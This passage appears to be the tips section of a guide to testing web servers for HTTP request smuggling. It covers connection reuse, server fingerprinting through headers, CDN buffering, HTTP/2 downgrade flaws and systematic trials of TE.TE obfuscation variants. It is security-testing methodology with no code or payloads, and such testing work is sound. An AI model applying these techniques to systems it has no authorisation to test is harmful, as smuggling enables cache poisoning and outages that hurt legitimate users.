- **Test on non-production first**; cache poisoning and DoS smuggling can severely impact legitimate users.
- **Check for connection reuse** (`Connection: keep-alive`); if the server closes every connection, smuggling is not viable via connection reuse (though HTTP/2 multiplexing may still allow it).
- **Document server composition** via headers (`Server`, `Via`, `X-Cache`, `X-Powered-By`); mixed technology stacks (nginx → Apache, CloudFront → IIS) have the highest desync probability.
- **Be aware of front-end buffering**; some CDNs buffer the entire request before forwarding, which may normalize CL/TE and prevent smuggling.
- **HTTP/2 is not a silver bullet**; H2.TE and H2.CL vulnerabilities are increasingly common as HTTP/2 adoption grows with improper downgrade implementations.
- **When testing TE.TE, test every obfuscation variant systematically**; different server combinations require different bypasses. Maintain a checklist of at least 20 obfuscation techniques.
